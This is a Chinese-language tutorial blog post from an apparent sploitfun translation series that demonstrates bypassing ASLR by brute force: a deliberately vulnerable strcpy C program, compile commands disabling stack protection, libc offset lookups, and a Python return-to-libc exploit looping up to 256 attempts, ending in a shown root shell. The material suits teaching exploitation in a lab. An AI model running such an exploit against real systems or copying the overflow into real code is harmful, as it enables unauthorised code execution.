---
layout: post
title: 通过brute force绕过ASLR
excerpt: "sploitfun系列教程之2.3.2 brute_force"
categories: [sploitfun系列教程]
comments: true
---

本文我们通过爆破的方式来bypass共享地址库的随机化

漏洞代码
```c
//vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 fflush(stdout);
 return 0;
}
```
编译
```bash
echo 2 > /proc/sys/kernel/randomize_va_space
gcc -fno-stack-protector -g -o vuln vuln.c -m32
chmod 777 vuln
```
首先我们通过动态的方式查看一下libc的基地址
```bash
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf7519000)
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf75bd000)
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf7574000)
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf7530000)
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf750a000)
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf75b9000)
sh-4.2# ldd ./vuln | grep libc
	libc.so.6 => /lib/libc.so.6 (0xf7523000)
```
我们看到只有8bits的地址是随机的，即最多尝试256次，就可以成功，下面我们编写exp代码

通过`readelf -s /lib/libc.so.6  | grep system`查看system的offset
```
  246: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1454: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
   513: 00000000     0 FILE    LOCAL  DEFAULT  ABS system.c
   514: 0003ea40  1089 FUNC    LOCAL  DEFAULT   13 do_system
  5193: 00132650    73 FUNC    LOCAL  DEFAULT   13 __GI_svcerr_systemerr
  7022: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system
  7618: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
  7683: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system
```
最后的exp
```python
# exp.py
# !/usr/bin/env python
import struct
from subprocess import call

libc_base_addr = 0xf7523000
whatever = 0xffffffff
system_off = 0x0003ef70  # Obtained from "readelf -s libc.so.6 | grep exit" command.
system_addr = libc_base_addr + system_off
system_arg = 0x804826e  #   objdump -s vuln | less


# endianess convertion
def conv(num):
    return struct.pack("<I", num)

# Junk + system + whatever + system_arg
buf = "A" * 268
buf += conv(system_addr)
buf += conv(whatever)
buf += conv(system_arg)

print "Calling vulnerable program"
# Multiple tries until we get lucky
i = 0
while (i < 256):
    print "Number of tries: %d" % i
    i += 1
    ret = call(["./vuln", buf])
    if (not ret):
        break
    else:
        print "Exploit failed"
```
最后的结果
```shell
Exploit failed
Number of tries: 61
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApV鬣[U鱪
sh-4.2# who
root     pts/0        2019-11-08 23:19 (61.172.241.120)
```
竟然真成功了。。。。
